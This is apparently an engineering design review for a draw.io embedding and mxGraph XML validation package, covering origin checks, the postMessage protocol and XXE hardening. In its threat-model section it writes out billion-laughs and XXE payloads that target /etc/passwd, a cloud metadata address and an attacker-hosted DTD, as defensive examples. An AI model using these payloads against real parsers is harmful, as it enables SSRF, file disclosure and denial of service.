# Phase 53 (0.3.x) — Primitive Review: Origin-Verification, XML-Parsing, and Embed-Protocol Inventory (Task 1)

Task 1 output for `plans/053-Prism-Diagrams-Package.md`. Read-only survey of existing Prism primitives, origin-verification precedents, draw.io / diagrams.net `proto=json` embed protocols, XXE-safe XML parsing mechanics, and canonical XML formatting before implementing `@arnilo/prism-diagrams` (P10–P12, P13–P15). Line refs verified against the working tree at review time.

**Verdict: Maximum reuse of Prism origin verification, error hierarchies, telemetry seams, cap enforcement, and browser-test gating patterns, paired with a dedicated data-first postMessage embed client and XXE-hardened XML parser.** `@arnilo/prism-diagrams` enforces origin and `event.source` verification on every message inside the client, prohibits wildcard `targetOrigin: "*"`, rejects Visio inputs, and provides secure validation and stable canonicalization of mxGraph XML without network, filesystem, or ambient environment access.

---

## 1. Origin & `event.source` Verification Precedents

Prism enforces strict origin and SSRF boundaries across client and server packages. The `@arnilo/prism-diagrams` embed client directly builds upon these established patterns.

### 1.1 In-Repo Origin Verification Precedents

| Primitive / Seam | Location | Mechanism & Security Posture | Application in `@arnilo/prism-diagrams` |
| --- | --- | --- | --- |
| `exactOrigin` Helper | `packages/ag-ui/src/mcp-apps.ts:L352-L359` | Parses URL via `new URL(val)`. Requires `url.origin === val`, protocol `https:`, no username, password, query (`search`), or fragment (`hash`). | Extended in `src/origin.ts` as `validateDiagramsOrigin`: requires valid `https:` or `http:` (for local/self-hosted dev/CI) URL origin matching `url.origin === value`, explicitly rejects wildcard `*`, trailing slashes/paths, search params, and hash fragments. |
| Origin Allow-List Gating | `packages/ag-ui/src/mcp-apps.ts:L98, L110` | Validates inbound `Origin` header against `options.allowedOrigins.includes(origin)`; fails closed with HTTP 403 / non-disclosing error. | Client verifies inbound `event.origin === configuredOrigin` for every `MessageEvent`. Messages from foreign origins are dropped pre-parse. |
| DNS-Pinned Fetch & Exact Host Transport | `src/pinned-fetch.ts:L1-L150`, `packages/mcp/src/transport.ts:L1-L260`, `docs/mcp-tools.md` | Resolves hostname once (1–32 IPs), verifies every candidate against SSRF policy, binds socket to pinned address, rejects 3xx redirects. | Outbound postMessage calls use the exact configured origin string as `targetOrigin`. `targetOrigin: "*"` is structurally forbidden. |
| Structural DOM Decoupling | `packages/ag-ui/src/acp/agent.ts`, `packages/browser/src/types.ts` | Types DOM/browser nodes structurally without requiring TypeScript `DOM` library in package tsconfig. | `DrawioEmbedFrame` typed structurally as `{ contentWindow: { postMessage(message: unknown, targetOrigin: string): void } }` to support Node unit testing and vanilla/React/Svelte/Vue embed containers. |
| Injectable Message Bus for Tests | `packages/ag-ui/src/` | Allows injecting synthetic message sources/sinks for determinism in unit test suites. | `DrawioEmbedOptions` accepts optional `messageTarget` (default `window`) and `messageSource` (default `window`) enabling full headless Node.js unit testing with mock event dispatchers. |

### 1.2 Inbound Message Verification Algorithm

The origin verification check is the critical security boundary of the embed client. Every inbound message must satisfy two strict predicates before any parsing or processing occurs:

```
                                 Inbound `message` event
                                            │
                                            ▼
                          ┌───────────────────────────────────┐
                          │  1. Check Origin:                 │
                          │     event.origin === origin       │
                          └─────────────────┬─────────────────┘
                                            │
                                  Match? ───┴─── No ──► [ DROP MESSAGE SILENTLY ]
                                            │
                                           Yes
                                            ▼
                          ┌───────────────────────────────────┐
                          │  2. Check Event Source:           │
                          │     event.source ===              │
                          │     iframe.contentWindow          │
                          └─────────────────┬─────────────────┘
                                            │
                                  Match? ───┴─── No ──► [ DROP MESSAGE SILENTLY ]
                                            │
                                           Yes
                                            ▼
                          ┌───────────────────────────────────┐
                          │  3. Parse JSON & Validate Shape:  │
                          │     (Discriminated Union)         │
                          └─────────────────┬─────────────────┘
                                            │
                              Valid? ───────┴─── No ──► [ Emit onProtocolError ]
                                            │
                                           Yes
                                            ▼
                          ┌───────────────────────────────────┐
                          │  4. Dispatch Typed Callback       │
                          │     (init / save / export / ...)  │
                          └───────────────────────────────────┘
```

```ts
// src/embed.ts inbound verification core:
function handleInboundMessage(event: MessageEvent): void {
  // 1. Origin match (exact string comparison):
  if (event.origin !== configuredOrigin) {
    return; // foreign origin: drop immediately
  }
  // 2. Window source match (must be the iframe's contentWindow):
  if (event.source !== iframe.contentWindow) {
    return; // foreign window/frame: drop immediately
  }
  // 3. Payload normalization and envelope parsing:
  let payload: unknown;
  try {
    payload = typeof event.data === "string" ? JSON.parse(event.data) : event.data;
  } catch {
    onProtocolError?.(new DiagramsProtocolError("ERR_PRISM_DIAGRAMS_PROTOCOL", "Malformed JSON from embed iframe"));
    return;
  }
  // 4. Dispatch to typed event handlers...
}
```

### 1.3 Outbound Message Security Invariant

To eliminate cross-origin message leaks:
1. Every call to `iframe.contentWindow.postMessage(msg, targetOrigin)` MUST supply `targetOrigin = configuredOrigin`.
2. Supplying `targetOrigin: "*"` is prohibited by design. An assertion in the postMessage wrapper validates that `targetOrigin` is a valid, non-wildcard origin matching `configuredOrigin`.

---

## 2. Diagrams.net `proto=json` Embed Protocol Specification

Diagrams.net (formerly draw.io) provides an iframe-based embedding mode driven by `postMessage` messaging. Configured via URL search parameters (`?embed=1&proto=json&spin=1`), all communication under `proto=json` occurs as JSON-serialized messages.

### 2.1 Editor-to-Host Events (Inbound Message Inventory)

Messages sent by the draw.io editor iframe to the parent host window contain an `event: string` discriminator.

| Event (`event`) | Accompanying Fields | Description & Lifecycle Role |
| --- | --- | --- |
| `init` | none | **Initial handshake.** Emitted when the editor UI has initialized and is ready to receive diagram data. The host MUST wait for `init` before sending the `load` action. |
| `load` | none | Emitted after a file is loaded or after processing a host `load` action. |
| `save` | `xml: string`, `exit?: boolean` | Emitted when user clicks "Save" in the editor. Contains current diagram XML. If "Save and Exit" was clicked, `exit: true` is set. |
| `autosave` | `xml: string` | Emitted periodically while editing when `autosave: 1` was requested in the `load` action. Contains current diagram XML draft. |
| `exit` | `modified: boolean` | Emitted when user clicks "Exit" or "Close". `modified` indicates if unsaved edits exist. |
| `configure` | none | Emitted during editor startup if configuration is requested. Host responds with `{ action: "configure", config: { ... } }`. |
| `export` | `format: string`, `data: string`, `xml?: string`, `bounds?: { x, y, width, height }` | Emitted in response to a host `{ action: "export" }` request. `data` contains export payload (SVG XML string or base64 data URI). |
| `error` | `message: string` | Emitted by the editor when an internal error or export failure occurs. |
| `unknownMessage` | unparsed payload | Any unrecognized event discriminator. Dropped safely and routed to optional `onProtocolError` callback. |

### 2.2 Host-to-Editor Actions (Outbound Message Inventory)

Messages sent by the host application to the draw.io editor iframe contain an `action: string` discriminator.

| Action (`action`) | Accompanying Fields | Description & Protocol Role |
| --- | --- | --- |
| `load` | `xml: string`, `autosave?: 0 \| 1 \| boolean`, `saveAndExit?: 0 \| 1 \| boolean`, `noSaveBtn?: 0 \| 1 \| boolean`, `noExitBtn?: 0 \| 1 \| boolean`, `title?: string` | Loads diagram XML into the editor canvas and configures UI buttons and autosave behavior. |
| `configure` | `config: Record<string, unknown>` | Injects editor configuration (custom colors, default styles, library palettes, UI theme). |
| `export` | `format: "xml" \| "xmlsvg" \| "xmlpng" \| "json" \| "png" \| "svg"`, `scale?: number`, `border?: number`, `embedImages?: boolean`, `xml?: string` | Requests an export of the current canvas (or supplied XML) in the requested format. Response returns via `export` event. |
| `merge` | `xml: string` | Merges elements from the provided XML into the active diagram model. |
| `dialog` | `title: string`, `message: string`, `button: string` | Displays a modal alert dialog inside the editor iframe. |
| `prompt` | `title: string`, `defaultValue?: string`, `ok: string` | Displays an input prompt dialog inside the editor iframe. |
| `template` | `xml?: string`, `name?: string` | Opens template selection dialog or loads specified template. |
| `draft` | `xml: string`, `editKey?: string` | Stores draft state in the editor session. |
| `status` | `message: string`, `modified?: boolean` | Updates the status bar message displayed at the bottom of the editor. |
| `spinner` | `show: boolean`, `message?: string` | Shows or hides the loading spinner overlay in the editor. |
| `fit` | none | Automatically fits the diagram to the visible canvas viewport. |
| `resetEditor` | none | Resets the editor session and clears the canvas. |

### 2.3 Protocol Distinction: `ready` vs `init`

In legacy draw.io embed protocols (when `proto=json` was omitted), the editor signaled initialization via URL fragment changes or a raw string/event `ready`.
Under the modern `proto=json` protocol:
1. The editor **strictly emits `{ event: "init" }`** as the initialization handshake.
2. The legacy `ready` event is neither generated nor accepted under `proto=json`.
3. The client state machine transitions from `INITIALIZING` to `READY` upon receiving `{ event: "init" }`.

### 2.4 Data-First TypeScript Discriminated Unions

The message protocol is modeled as strict discriminated unions:

```ts
// Inbound Editor Events:
export type DrawioInboundEvent =
  | { readonly event: "init" }
  | { readonly event: "load" }
  | { readonly event: "save"; readonly xml: string; readonly exit?: boolean }
  | { readonly event: "autosave"; readonly xml: string }
  | { readonly event: "exit"; readonly modified: boolean }
  | { readonly event: "configure" }
  | { readonly event: "export"; readonly format: string; readonly data: string; readonly xml?: string; readonly bounds?: { readonly x: number; readonly y: number; readonly width: number; readonly height: number } }
  | { readonly event: "error"; readonly message: string };

// Outbound Host Actions:
export type DrawioOutboundAction =
  | { readonly action: "load"; readonly xml: string; readonly autosave?: boolean | 0 | 1; readonly saveAndExit?: boolean | 0 | 1; readonly noSaveBtn?: boolean | 0 | 1; readonly noExitBtn?: boolean | 0 | 1; readonly title?: string }
  | { readonly action: "configure"; readonly config: Readonly<Record<string, unknown>> }
  | { readonly action: "export"; readonly format: "xml" | "xmlsvg" | "xmlpng" | "json" | "png" | "svg"; readonly scale?: number; readonly border?: number; readonly xml?: string }
  | { readonly action: "merge"; readonly xml: string }
  | { readonly action: "dialog"; readonly title: string; readonly message: string; readonly button: string }
  | { readonly action: "prompt"; readonly title: string; readonly defaultValue?: string; readonly ok: string }
  | { readonly action: "template"; readonly xml?: string; readonly name?: string }
  | { readonly action: "draft"; readonly xml: string; readonly editKey?: string }
  | { readonly action: "status"; readonly message: string; readonly modified?: boolean }
  | { readonly action: "spinner"; readonly show: boolean; readonly message?: string }
  | { readonly action: "fit" }
  | { readonly action: "resetEditor" };
```

---

## 3. XXE-Safe XML Parser Options & mxGraph Model Validation

Draw.io diagrams are stored in XML format (`mxGraphModel`). Because XML parsing of untrusted diagrams exposes severe security risks (XML External Entity injection, SSRF, local file disclosure, and denial-of-service via entity expansion), `@arnilo/prism-diagrams` implements multi-layered defense-in-depth.

### 3.1 mxGraph XML Structure

Draw.io XML documents contain standard hierarchical elements:

```xml
<mxfile host="drawio.internal" modified="2026-09-01T00:00:00.000Z" agent="Prism" version="24.0.0">
  <diagram id="diag-1" name="Page-1">
    <mxGraphModel dx="1000" dy="800" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100">
      <root>
        <mxCell id="0"/>
        <mxCell id="1" parent="0"/>
        <mxCell id="2" value="Actor" style="shape=umlActor;..." vertex="1" parent="1">
          <mxGeometry x="100" y="100" width="30" height="60" as="geometry"/>
        </mxCell>
        <mxCell id="3" value="" style="endArrow=classic;..." edge="1" parent="1" source="2" target="4">
          <mxGeometry relative="1" as="geometry"/>
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
```

Payloads can also be compressed: `<diagram id="..." name="..." compressed="true">base64(deflate(xml))</diagram>`.

### 3.2 XXE & Entity Expansion Vulnerabilities

1. **Billion Laughs / Quadratic Blowup (DoS)**:
   Recursive or nested entity declarations that expand exponentially in memory:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
   ]>
   <mxfile><diagram><mxGraphModel><root><mxCell id="0"/><mxCell id="1" parent="0" value="&lol3;"/></root></mxGraphModel></diagram></mxfile>
   ```
2. **External Entity SSRF / Local File Disclosure**:
   ```xml
   <!DOCTYPE mxfile [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
   <!DOCTYPE mxfile [ <!ENTITY passwd SYSTEM "file:///etc/passwd"> ]>
   ```

### 3.3 Defense-in-Depth Parser Architecture (`drawio-mcp-server` Pattern)

To achieve complete protection against XML entity attacks:

1. **Up-Front DOCTYPE/ENTITY Rejection**:
   Prior to parsing, the input string is tested against `UNSAFE_XML_DECLARATION_PATTERN`:
   ```ts
   const UNSAFE_XML_DECLARATION_PATTERN = /<!\s*(?:DOCTYPE|ENTITY)/i;
   ```
   If matched, validation throws `DiagramsXxeError` (`ERR_PRISM_DIAGRAMS_XXE`) immediately without invoking any XML parser.

2. **Parser Configuration (`fast-xml-parser`)**:
   `fast-xml-parser` (pinned dependency) is configured with entity expansion disabled:
   ```ts
   const parser = new XMLParser({
     ignoreAttributes: false,
     attributeNamePrefix: "@_",
     allowBooleanAttributes: false,
     processEntities: false,  // ENTITY PROCESSING DISABLED
     htmlEntities: false,     // HTML ENTITIES DISABLED
     stopNodes: [],
   });
   ```

3. **Input Cap Enforcement**:
   - `maxBytes`: default 32 MiB, hard cap 512 MiB (enforced before parse).
   - `maxElements`: default 100,000, hard cap 500,000 (counted during traversal).
   - `maxAttributes`: default 500,000 (counted during traversal).

### 3.4 XXE Rejection Matrix

| Attack Vector | Malicious XML Pattern | Defense Layer | Result / Error Code |
| --- | --- | --- | --- |
| DOCTYPE Declaration | `<!DOCTYPE mxfile [ ... ]>` | Regex pre-scan (`UNSAFE_XML_DECLARATION_PATTERN`) | `ERR_PRISM_DIAGRAMS_XXE` |
| Internal Entity | `<!ENTITY name "value">` | Regex pre-scan | `ERR_PRISM_DIAGRAMS_XXE` |
| External General Entity | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Regex pre-scan | `ERR_PRISM_DIAGRAMS_XXE` |
| External Parameter Entity | `<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">` | Regex pre-scan | `ERR_PRISM_DIAGRAMS_XXE` |
| Billion Laughs Expansion | Nested `&lol9;` entity references | Pre-scan rejects DOCTYPE; `processEntities: false` in parser | `ERR_PRISM_DIAGRAMS_XXE` |
| Oversized / Bomb Payload | Massive repeated tags (>32 MiB or >100,000 elements) | Bounded byte & element caps (`validateCap`) | `ERR_PRISM_DIAGRAMS_XML_CAP` |
| Truncated XML | `<mxfile><diagram><mxGraphModel>` (unclosed) | `XMLValidator.validate(xml)` + `fast-xml-parser` | `ERR_PRISM_DIAGRAMS_XML_MALFORMED` |
| Non-mxGraph XML | `<svg><rect width="100"/></svg>` | Required structural element checks | `ERR_PRISM_DIAGRAMS_XML_INVALID_MODEL` |
| Visio Binary / XML | `.vsd` OLE header / `.vsdx` ZIP or Visio XML | P12 Visio exclusion check | `ERR_PRISM_DIAGRAMS_UNSUPPORTED_FORMAT` |

### 3.5 Model Summary Shape

`validateDrawioXml(xml: string, options?: DrawioXmlOptions): DrawioModelSummary` extracts structural metrics without allocating heavyweight ASTs:

```ts
export interface DrawioModelSummary {
  readonly pages: number;
  readonly cells: number;
  readonly edges: number;
  readonly width?: number;
  readonly height?: number;
  readonly compressed?: boolean;
}
```

---

## 4. Canonical XML Formatting for Content Hashing

Hosts need deterministic content hashing for diagrams stored in revision controls, artifact stores (e.g. Synapta RustFS/Postgres), and decision ledgers:
```ts
const contentHash = createHash("sha256").update(canonicalizeDrawioXml(xml)).digest("hex");
```

### 4.1 Canonicalization Requirements

Full W3C Canonical XML (C14N 1.1) involves complex namespace axis resolution and inheritance rules that are redundant for draw.io's XML format. `canonicalizeDrawioXml` implements lightweight, deterministic serialization:

1. **Attribute Sorting**:
   All attributes within an XML element are sorted lexicographically by attribute name ascending (`a-z`).
2. **Whitespace Normalization**:
   - Insignificant inter-tag whitespace (indentation, newlines between tags) is stripped.
   - Text node whitespace inside element bodies is trimmed or preserved according to XML content rules.
3. **Self-Closing Tag Normalization**:
   Empty elements consistently serialize as `<element attr="val"/>` (with a single space before `/>`).
4. **Stable Attribute Quoting**:
   Attribute values are always delimited by double quotes (`"`), with special characters escaped (`&` → `&amp;`, `<` → `&lt;`, `"` → `&quot;`).
5. **Element Hierarchy Preservation**:
   The exact sequence of child elements within parent nodes is preserved deterministically.

---

## 5. Browser-Test Gating & CI Fixture Precedents

Prism maintains a strict division between **network-free default unit test suites** and **protected/live integration suites**.

### 5.1 In-Repo Gating Precedents

| Suite / Capability | Environment Gating Variable | Failure Mode on Misconfiguration | Default `npm test` Behavior |
| --- | --- | --- | --- |
| Obscura Headless Browser | `PRISM_LIVE_OBSCURA=1` + `PRISM_OBSCURA_BIN` | `throw new Error("PRISM_LIVE_OBSCURA is set but PRISM_OBSCURA_BIN is missing...")` | Skipped cleanly; zero network calls. |
| Enterprise PostgreSQL | `PRISM_TEST_POSTGRES_URL` | Missing env is recorded as `blocked` in `release-evidence.json`; fails release gate fail-closed. | Skipped cleanly; in-memory fallback. |
| Native Linux Sandbox | Netns capability probe (`unshare`) | Fails creation with `ERR_PRISM_NATIVE_SANDBOX` if netns unsupported. | Tests probe netns support and skip gracefully if kernel forbids unshare. |
| Playwright Coding Journey | `PRISM_CODING_JOURNEY=1` + `PRISM_LIVE_PLAYWRIGHT` | Step failure fails the journey gate; missing prerequisite records `blocked`. | Skipped cleanly. |

### 5.2 `@arnilo/prism-diagrams` CI Fixture Design

To fulfill the acceptance criteria ("A CI fixture runs the self-hosted Apache-2.0 draw.io webapp and exercises load → edit → save → export `xmlsvg`"):

1. **Unit Test Suite (Default, Network-Free)**:
   `dist/__tests__/embed.test.js`, `dist/__tests__/xml.test.js`, `dist/__tests__/canonicalize.test.js` run in standard Node.js without browsers or network. Uses `DrawioEmbedFrame` mock and synthetic event dispatchers.
2. **Gated Live Test (`test:drawio`)**:
   - Gated behind `PRISM_TEST_DRAWIO_URL` (e.g. `PRISM_TEST_DRAWIO_URL=http://localhost:8080`).
   - If `PRISM_TEST_DRAWIO_URL` is set, Playwright launches a headless browser, opens `drawio.fixture.html`, embeds the self-hosted draw.io container, and drives the lifecycle: `init` → `load` → UI shape insertion → `save` → `export({ format: "xmlsvg" })`.
   - Also tests cross-origin isolation: a synthetic message sent from an unapproved origin inside the real browser is dropped.
3. **CI Service Container**:
   `.github/workflows/sandbox-browser.yml` runs service container `image: jgraph/drawio:latest` (Apache-2.0, Tomcat-based, self-contained without internet access).

---

## 6. Error Hierarchy & Codes (`ERR_PRISM_DIAGRAMS_*`)

Following `@arnilo/prism-rag` and `@arnilo/prism-documents`, `@arnilo/prism-diagrams` defines a strongly-typed error hierarchy in `src/errors.ts`:

```ts
export type DiagramsErrorCode =
  | "ERR_PRISM_DIAGRAMS_ORIGIN_INVALID"
  | "ERR_PRISM_DIAGRAMS_PROTOCOL"
  | "ERR_PRISM_DIAGRAMS_XXE"
  | "ERR_PRISM_DIAGRAMS_XML_MALFORMED"
  | "ERR_PRISM_DIAGRAMS_XML_CAP"
  | "ERR_PRISM_DIAGRAMS_XML_INVALID_MODEL"
  | "ERR_PRISM_DIAGRAMS_UNSUPPORTED_FORMAT"
  | "ERR_PRISM_DIAGRAMS_TIMEOUT";

export class DiagramsError extends Error {
  readonly code: DiagramsErrorCode;
  constructor(code: DiagramsErrorCode, message: string) {
    super(message);
    this.name = "DiagramsError";
    this.code = code;
  }
}

export class DiagramsOriginError extends DiagramsError {
  constructor(message: string) {
    super("ERR_PRISM_DIAGRAMS_ORIGIN_INVALID", message);
    this.name = "DiagramsOriginError";
  }
}

export class DiagramsProtocolError extends DiagramsError {
  constructor(code: DiagramsErrorCode = "ERR_PRISM_DIAGRAMS_PROTOCOL", message: string) {
    super(code, message);
    this.name = "DiagramsProtocolError";
  }
}

export class DiagramsXxeError extends DiagramsError {
  constructor(message = "XML contains forbidden DOCTYPE or ENTITY declaration") {
    super("ERR_PRISM_DIAGRAMS_XXE", message);
    this.name = "DiagramsXxeError";
  }
}

export class DiagramsCapError extends DiagramsError {
  constructor(message: string) {
    super("ERR_PRISM_DIAGRAMS_XML_CAP", message);
    this.name = "DiagramsCapError";
  }
}
```

---

## 7. Telemetry Seam (`DiagramsTelemetry`)

Following `packages/rag/src/telemetry.ts` and `packages/documents/src/telemetry.ts`, `@arnilo/prism-diagrams` exports a zero-dependency telemetry interface in `src/telemetry.ts`:

```ts
export type DiagramsTelemetryAttributeValue = string | number | boolean;

export interface DiagramsTelemetrySpan {
  setAttribute(name: string, value: DiagramsTelemetryAttributeValue): void;
  addEvent(name: string, attributes?: Readonly<Record<string, DiagramsTelemetryAttributeValue>>): void;
  recordError(): void;
  end(): void;
}

export interface DiagramsTelemetry {
  startSpan(
    name: string,
    attributes?: Readonly<Record<string, DiagramsTelemetryAttributeValue>>,
    parent?: DiagramsTelemetrySpan,
  ): DiagramsTelemetrySpan;
}
```

- **Allowed Spans**: `diagrams.validate`, `diagrams.canonicalize`, `diagrams.export`.
- **Allowed Attribute Keys**: `diagrams.bytes`, `diagrams.pages`, `diagrams.cells`, `diagrams.edges`, `diagrams.format`, `diagrams.durationMs`.
- **Data Privacy Guarantee**: Telemetry spans and events **never record diagram XML, node labels, cell contents, or export data URIs**.

---

## 8. P10–P15 Comprehensive Primitive Mapping

| Requirement | Scope & Acceptance Criteria | Reused Prism Primitives | New Diagrams Primitives (`packages/diagrams/src/`) |
| --- | --- | --- | --- |
| **P10: draw.io Embed Client** | `createDrawioEmbed({ iframe, origin })`, `proto=json` protocol (`init`/`load`/`save`/`autosave`/`exit`/`configure`/`export`), origin & `event.source` verification, wildcard `*` rejected, typed callbacks. | Exact origin validation pattern (`packages/ag-ui`), structural DOM interface pattern (`packages/browser`). | • `createDrawioEmbed` factory & client (`src/embed.ts`)<br>• Protocol message discriminated unions (`src/messages.ts`)<br>• Origin validator `validateDiagramsOrigin` (`src/origin.ts`)<br>• Typed event emitter / listener dispatcher (`src/embed.ts`) |
| **P11: mxGraph Model Helpers** | `validateDrawioXml(xml)` (well-formedness, caps, XXE safety, summary extraction), `canonicalizeDrawioXml(xml)` (stable attribute-sorted serialization for content hashing). | Cap validation (`document-reader`), SHA-256 hash helper (`artifacts.ts`, `audit-export.ts`). | • XXE pre-check & `fast-xml-parser` wrapper (`src/xml.ts`)<br>• mxGraph structure validator & summary builder (`src/xml.ts`)<br>• Stable XML canonicalizer (`src/canonicalize.ts`)<br>• XML cap resolver `validateDiagramsCaps` (`src/caps.ts`) |
| **P12: Visio Exclusion Guard** | `.vsd` and `.vsdx` files rejected with explicit error; no Visio import or export. | Magic byte detection (`document-reader`). | • Visio rejection guard `assertNotVisio` (`src/xml.ts`), throwing `DiagramsError("ERR_PRISM_DIAGRAMS_UNSUPPORTED_FORMAT")`. |
| **P13–P15: Cross-Package** | Decision B independent publication (0.3.0, peer `@arnilo/prism ^0.3.0`), zero I/O doctrine (no filesystem/network/env), OpenTelemetry seam. | `RagTelemetry` seam pattern (`rag/src/telemetry.ts`), package build scripts (`scripts/with-build-lock.mjs`). | • `DiagramsTelemetry` interface (`src/telemetry.ts`)<br>• Package manifest `packages/diagrams/package.json`<br>• Error hierarchy `DiagramsError` (`src/errors.ts`) |

---

## 9. Security, Trust Boundary & Invariant Summary

1. **Origin Verification as the Trust Boundary**:
   - The embed client requires an explicit, validated origin at construction. No public default `embed.diagrams.net` is provided.
   - Inbound messages from different origins or different window sources are dropped immediately without parsing.
   - Outbound messages post strictly to the configured origin; `targetOrigin: "*"` is blocked.
2. **XXE & DoS Protection**:
   - Pre-parse regex rejects `<!DOCTYPE` and `<!ENTITY` declarations (`ERR_PRISM_DIAGRAMS_XXE`).
   - `fast-xml-parser` entity processing is disabled.
   - Input size and element count caps are enforced upfront.
3. **Visio Exclusion (P12)**:
   - Binary and XML Visio formats are detected and rejected with `ERR_PRISM_DIAGRAMS_UNSUPPORTED_FORMAT`.
4. **Zero I/O Doctrine (P14)**:
   - Zero filesystem access, zero socket operations, zero `fetch` calls, zero `process.env` access.
   - Communication is restricted exclusively to `window.postMessage` with the configured embed origin.
5. **Content-Free Observability (P15)**:
   - Telemetry captures structural counts and durations only; diagram content is never logged.

---

## 10. Architectural Decisions Locked by This Review

1. **Pinned `fast-xml-parser` for Safe Parsing**: Depend on `fast-xml-parser` with entity processing disabled and up-front DOCTYPE/ENTITY rejection regex, rather than hand-rolling an ad-hoc XML parser.
2. **Structural `DrawioEmbedFrame` Interface**: Decouples the client from browser DOM global types, making it portable across React, Vue, Svelte, and Node.js test environments.
3. **Discriminative Union Message Envelope**: Matches the diagrams.net `proto=json` spec directly, ensuring compile-time safety across all editor events and host actions.
4. **Lightweight Deterministic Canonicalizer**: Implements attribute sorting, tag self-closing normalization, and whitespace cleanup sufficient for stable SHA-256 diagram hashing without heavyweight C14N 1.1 engine overhead.
5. **Playwright Gated Fixture**: Isolates self-hosted Docker-based E2E tests behind `PRISM_TEST_DRAWIO_URL`, preserving a 100% network-free default `npm test`.
